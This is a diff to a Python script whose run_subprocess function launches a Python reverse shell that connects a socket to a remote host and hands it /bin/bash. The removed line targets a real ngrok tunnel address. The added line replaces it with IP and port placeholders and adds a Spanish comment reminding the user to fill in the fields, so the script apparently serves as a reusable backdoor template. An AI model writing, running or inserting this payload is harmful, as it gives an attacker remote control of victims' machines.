@@ -1,3 +1,5 @@
+# RECUERDE EDITAR TODOS LOS CAMPOS PERTINENTES!
+
 import time
 import subprocess
 import random
@@ -57,7 +59,7 @@ def countdown(duration):
 
 def run_subprocess():
     try:
-        output = subprocess.check_output(["python", "-c", "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('0.tcp.ngrok.io',12122));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('/bin/bash')"])
+        output = subprocess.check_output(["python", "-c", "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<IP>,<PUERTO>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('/bin/bash')"])
         print(output.decode())
     except subprocess.CalledProcessError as error:
         print(error)
